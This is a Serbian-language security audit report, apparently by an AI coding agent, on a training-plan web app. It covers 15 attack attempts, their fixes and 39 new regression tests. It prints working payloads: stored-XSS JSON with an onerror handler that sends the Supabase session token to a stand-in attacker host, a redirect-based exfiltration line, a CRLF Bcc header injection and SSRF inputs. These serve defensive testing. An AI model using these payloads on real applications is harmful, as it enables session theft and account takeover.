# Bezbednosna analiza — SUB-20

**Grana:** `claude/app-review-report-roi7oy`
**Verzija:** 140 → **141**
**Metod:** ofanzivni — svaki nalaz je **izveden napad**, ne teorijska primedba
**Testovi:** 110 → **149** (39 novih, svi bezbednosni)

---

## Rezime

Izvedeno je **15 napada** na pet ulaznih površina. **Osam je prošlo.** Svih osam je zatvoreno, i svaki je sada trajni test — ako se rupa vrati, pada CI.

| # | Napad | Ishod pre | Ozbiljnost |
|---|---|---|---|
| 1 | XSS kroz ID dana iz uvezenog backupa | **PROŠAO** | **KRITIČNA** |
| 2 | XSS kroz PRED red (`id`, `q`) | **PROŠAO** | **KRITIČNA** |
| 3 | XSS kroz ID dana u listi za pomeranje | **PROŠAO** | **KRITIČNA** |
| 4 | XSS kroz zapise o oporavku → kartica Oporavak | **PROŠAO** | **KRITIČNA** |
| 5 | XSS kroz zapise o oporavku → HRV grafikon | **PROŠAO** | **KRITIČNA** |
| 6 | XSS kroz zapise o oporavku → kartica treninga | **PROŠAO** | **KRITIČNA** |
| 7 | Zamena prijavljenog naloga podmetnutim tokenom | **PROŠAO** | VISOKA |
| 8 | CR/LF u naslovu mejla (ubacivanje zaglavlja) | **PROŠAO** | NISKA |
| 9 | Prototype pollution kroz uvoz backupa | odbijen | — |
| 10 | SSRF kroz `athleteId` (8 oblika) | odbijen | — |
| 11 | Krađa spiska adresa bez ovlašćenja | odbijen | — |
| 12 | Zaobilaženje dnevnog limita AI poziva | odbijen | — |
| 13 | CSRF na OAuth (Strava i intervals.icu) | odbijen | — |
| 14 | Tag injekcija kroz odgovor AI servera | odbijen | — |
| 15 | HTML injekcija u telo mejla | odbijen | — |

---

## Model pretnje

Pet mesta gde u aplikaciju ulazi podatak koji ona ne kontroliše:

| Izvor | Ko ga kontroliše | Širina |
|---|---|---|
| **Uvezen backup** | bilo ko ko ti pošalje fajl | najšira — proizvoljan JSON u celo stanje |
| URL pri OAuth povratku | ko ti pošalje link | `?code=`, `#access_token=` |
| Odgovor AI servera | Google Gemini | tekst koji ide u `innerHTML` |
| Strava / intervals.icu | njihov API i tvoje aktivnosti | nazivi, zapisi o oporavku |
| Telo zahteva ka `api/` | bilo ko sa važećom prijavom | JSON |

**Zašto je XSS najteži ishod, a ne „samo iskačući prozor":** `localStorage` drži Supabase sesiju (`sub19_sb`), Strava access + refresh token i intervals.icu token. Jedan uspešan `<img onerror>` uzima sve troje. Supabase sesija znači potpuno preuzimanje naloga; intervals.icu token po njihovoj dokumentaciji **ne ističe**.

**CSP ne spašava.** Aplikacija **jeste** jedna velika inline skripta, pa `script-src` mora da dozvoli `'unsafe-inline'` — ubačena skripta se izvršava. CSP ipak nije beskoristan: `connect-src 'self' supabase strava` blokira `fetch()` ka napadačevom serveru, a `img-src 'self' data:` blokira slike-svetionike. Ali **ne blokira odlazak na drugu adresu** (`location.href='https://zlo.rs/?t='+token`), pa je izvlačenje podataka i dalje moguće. Dakle CSP smanjuje, ne uklanja — jedina prava odbrana je da injekcije nema.

---

## Prošli napadi — detaljno

### 1–3. Stored XSS kroz ID-jeve iz uvezenog backupa · KRITIČNA

**Scenario:** napadač ti pošalje `backup.json` („uvezi da vidiš moj plan"). Uvoz je prihvatao proizvoljan JSON.

**Payload:**
```json
{ "genPlan": { "weeks": [ { "start": "2026-06-22", "days": [
  { "dow": 0, "tag": "tempo", "km": 8,
    "id": "\"><img src=x onerror=\"fetch('https://zlo.rs/?t='+localStorage.getItem('sub19_sb'))\">" }
]}]}}
```

**Zašto je radilo:** ID dana je završavao u HTML atributima bez `esc()`:

```js
id="ai-go-${d.id}"        id="ai-out-${d.id}"       id="lbl-tempo-${d.id}"
data-swd="${d.id}"        id="${fid('km')}"  →  f-km-${d.id}
data-wseg="${pid}"        data-wpin="${pid}"        data-q="${r.q}"
```

**Dokaz (stvarni izlaz pre popravke):**
```html
<button type="button" id="ai-go-"><img src=x onerror="fetch('https://zlo.rs/?t='+localStorage.getItem('sub19_sb'))">" class="btn-ai">
```

**Ispravka — dva nivoa, namerno:**

1. **Granica poverenja.** ID-jevi su mašinski generisani (`n1d1`, `g12d3`, `p2b`, `kt-n1d1`) i uvek odgovaraju `^[A-Za-z0-9_-]{1,64}$`. Uvoz sada odbija fajl sa bilo kojim ID-em van tog oblika — `validanId()`, `validanGenPlan()` (dani, PRED redovi, `qs` ključevi) i `losIdUStanju()` (`log`, `pred`, `predLock`, `alts`, `moves`, `vdotLog`, `knee.id`, `knee.src`, `kg.src`).
2. **Iscrtavanje.** `esc()` na svih 9 mesta, plus usklađeni CSS selektori (`querySelector` mora da traži istu, escapovanu vrednost).

Jedan nivo je dovoljan da napad ne prođe. Druga je tu jer se sutra doda kartica koja zaboravi `esc()`.

---

### 4–6. Stored XSS kroz zapise o oporavku · KRITIČNA

**Zašto je promaklo:** `/api/wellness` **već** pretvara vrednosti u brojeve (`broj()` u `izvuci()`), pa je živ put bezbedan — i lako je zaključiti da je stvar rešena. Ali `S.wellness` se puni i iz **uvoza backupa** i iz `sbPull()`, a tamo nije bilo nikakve provere. Odatle su vrednosti išle **sirove** u tri prikaza:

- kartica **Oporavak** (`karticaOporavka`) — `<b style="color:${boja}">${val}</b>`
- **HRV grafikon** — `<text ...>${v[v.length-1].hrv}</text>` (injekcija u SVG)
- red **„Tog jutra"** na kartici treninga (`formHTML`)

**Payload:** `{"wellness":{"2026-07-01":{"hrv":"\"><img src=x onerror=...>"}}}`

**Ispravka:**
1. `cistWellness()` u `migrate()` — svaka vrednost prolazi kroz pretvaranje u broj, ključ mora biti datum, sve ostalo se odbacuje. Pokriva **i uvoz i `sbPull`**, jer oba idu kroz `migrate`.
2. `esc()` na svim mestima iscrtavanja.

---

### 7. Zamena prijavljenog naloga podmetnutim tokenom · VISOKA

`sbCheckState()` je proveravao **postojanje** markera, ne poređenje vrednosti — jer Supabase GoTrue interno koristi `state` parametar za svoju CSRF zaštitu, pa aplikacija svoj ne može da provuče (to je u kodu i objašnjeno).

**Posledica:** u prozoru od 10 minuta posle klika na „Prijavi se", link `https://sub-19.vercel.app/#access_token=<NAPADAČEV_JWT>` bio bi usvojen. Odatle `sbPush()` gura **tvoje** podatke u **napadačev** Supabase red.

**Ispravka (bez ijedne izmene u Supabase podešavanjima):**
- Prozor 10 min → **3 min** (odlazak na Google i nazad traje sekunde).
- **Token za drugi nalog se odbija** dok se prethodni ne odjavi svesno — poredi se `sub` iz JWT-a sa `SB.userId`. Ovo zatvara najštetniji ishod: zamenu postojeće sesije tuđom.
- Usvojen token se **odmah proverava** kod Supabase-a; ako je neispravan, sesija se odbacuje umesto da app radi sa njom.

**Ostatak rizika (pošteno):** korisnik koji **još nije prijavljen** i klikne login, pa u ta 3 minuta otvori napadačev link — i dalje bi usvojio tuđu sesiju. Video bi tuđ mejl u Podešavanjima, ali bi mu se lokalni podaci sinhronizovali u tuđ nalog.

**Potpuno rešenje traži jednu izmenu kod tebe** (v. „Preporuke" dole).

---

### 8. CR/LF u naslovu mejla · NISKA

`subject: 'SUB-20 bug — ' + description.slice(0, 60)` — naslov gradi korisnički tekst.

**Dokaz:**
```
opis:    "Bug\nBcc: napadac@zlo.rs\nX-Evil: da"
naslov:  "SUB-20 bug — Bug\nBcc: napadac@zlo.rs\nX-Evil: da"
```

Resend prima JSON i najverovatnije bi to sam odbio, ali oslanjati se na to je pogrešan red. Novi red se sada uklanja pre slanja.

---

## Odbijeni napadi — šta je već bilo dobro

Ovo nije popunjavanje izveštaja; svaki od njih je stvarno izveden i vraćen praznih ruku.

**Prototype pollution.** `{"ui":{"__proto__":{"zagadjeno":"DA"}}}` kroz `Object.assign` u `migrate()` — prototip ostaje čist.

**SSRF.** Osam oblika `athleteId` (`1@zlo.rs`, `1/../../evil`, `i1%2f%2fzlo.rs`, `http://zlo.rs`, `1\n2`…) — svi odbijeni sa HTTP 400 pre nego što išta izađe. Nijedan zahtev nije napustio `intervals.icu`/`supabase`. Zasluga: `^i?\d+$` i fiksan URL.

**Autorizacija.** Običan prijavljen korisnik na `/api/broadcast` → **401**. Provera se radi nad mejlom pročitanim **sa Supabase servera iz tokena**, ne nad onim što pregledač tvrdi.

**Dnevni limit.** Uz `DAILY_LIMIT_EXCEEDED` LLM je pozvan **0 puta**, odgovor 429.

**OAuth CSRF.** Strava i intervals.icu: pogrešan / istekao / odsutan / **već potrošen** state — sve odbijeno; `state` je `crypto.getRandomValues`, ne `Math.random`; svaki servis ima svoj ključ pa jedan povratak ne troši tuđi.

**Odgovor AI servera.** `mdToHtml` escapuje **pre** parsiranja markdowna, pa `<img>`, `<script>`, `<svg/onload>`, `<iframe>` i `javascript:` izlaze kao tekst. Ovo je bilo dobro napisano od početka.

**Telo mejla.** Kontekst prijave buga (`userAgent`, `tab`, `version`) je escapovan.

**service_role ključ.** Postoji samo u `daily-report.js` i `broadcast.js` (oba iza `CRON_SECRET`/vlasnika), nigde u klijentu. Provereno testom koji traži **stvarnu vrednost** ključa, ne pomen imena.

---

## Novi bezbednosni testovi (39)

`test/bezbednost.test.mjs` — svaki test je napad koji je jednom prošao.

| Grupa | Šta drži zatvorenim |
|---|---|
| Granica poverenja | `validanId`, `validanGenPlan`, `losIdUStanju` — na 5 oblika payloada × 9 mapa |
| Drugi sloj | `formHTML`, `weekSwapHTML`, `renderKnee`, `renderPlan`, `renderDanas`, `openSettings`, `mdToHtml`, `safeTag` |
| Oporavak | kartica, HRV grafikon, red „Tog jutra", `cistWellness`, `migrate` |
| **Fuzz** | **otruje SVAKO polje stanja i iscrta svaki ekran i modal** |
| Tokeni | ni izvoz ni sinhronizacija ne nose tokene |
| OAuth | CSRF, nasumičnost, jednokratnost, dužina prozora, zaštita naloga |
| Server | SSRF, zaglavlja mejla, autorizacija, limit, `service_role` |

**Fuzz test je najvredniji** — ne cilja poznatu rupu nego traži one koje nisam nabrojao. Otruje `genPlan`, `log`, `pred`, `knee`, `kg`, `vdotLog`, `strava`, `icu`, `wellness`, `ui` i iscrta svih 5 tabova plus 6 modala. Ako buduća kartica zaboravi `esc()`, ovo pada bez da se test menja.

---

## Preostali rizik i preporuke

### 1. Nepotpuna zaštita Supabase prijave — traži JEDNU izmenu kod tebe

Ostatak iz napada 7 zatvara se prosleđivanjem sopstvenog nonce-a kroz `redirect_to`:

```js
location.href = SB_URL + '/auth/v1/authorize?provider=google&redirect_to='
  + encodeURIComponent(location.origin + '/?sbn=' + nonce);
```
pa se po povratku poredi `?sbn=` sa sačuvanim. Ne sudara se sa GoTrue-ovim internim `state`.

**Nisam ovo primenio** jer traži da u **Supabase → Authentication → URL Configuration → Redirect URLs** dodaš:
```
https://sub-19.vercel.app/**
```
Bez toga Supabase odbacuje `redirect_to` sa upitom i vraća na Site URL — prijava bi pukla za sve korisnike. Reci kad dodaš, pa primenim kod.

### 2. `ADMIN_EMAIL` u javnom kodu

`index.html:6979`. Bezbednosno bezopasno (server proverava adresu iz tokena, klijent samo odlučuje da li da prikaže dugme), ali je adresa izložena skreperima. Ispravka je poređenje po Supabase `userId` — pošalji ga i menjam.

### 3. `unsafe-inline` u CSP

Neizbežno dok je aplikacija jedan inline `<script>`. Uklonilo bi se izdvajanjem skripte u zaseban fajl + `script-src 'self'`, što je deo šireg refaktora (menja način deploya). Do tada `connect-src` ograničava izvlačenje na `fetch`, ali ne i na navigaciju.

### 4. Nema rate-limita na `/api/wellness` i `/api/workouts`

Prijavljen korisnik može kroz tvoj server neograničeno gađati intervals.icu (tvoja IP adresa nosi posledice). Traži novu Supabase RPC funkciju i tabelu — dakle izmenu na tvojoj strani, pa nisam dirao.

### 5. `ICU_REDIRECT_URI`

I dalje nije postavljen; bez njega se `redirect_uri` gradi iz `x-forwarded-host` zaglavlja. Nije iskoristivo (intervals.icu proverava prema registrovanom), ali vredi zatvoriti — vrednost sam ti dao ranije.

---

## Šta i dalje nije dirano

Ista granica kao u prethodnom izveštaju, ponovo mašinski provereno posle svih bezbednosnih izmena:

| Vrednost | Pre svih izmena | Sada |
|---|---|---|
| START / RACE | 2026-06-22 / 2026-09-24 | isto |
| Ukupno km / treninga | 533,7 / 72 | isto |
| VDOT početni / ciljni | 48,1 / 51,3 | isto |
| PRED / QS | 25 / 24 | isto |

`LS_KEY`, `SB_KEY`, prefiks `sub19-` za intervals.icu događaje, `BAZA`, env varijable, Supabase tabele i RPC-jevi, Resend — **ništa od toga nije menjano i ništa ne treba da podešavaš.**

---

## Provera

```bash
node --test "test/**/*.test.mjs"     # 149 testova
```
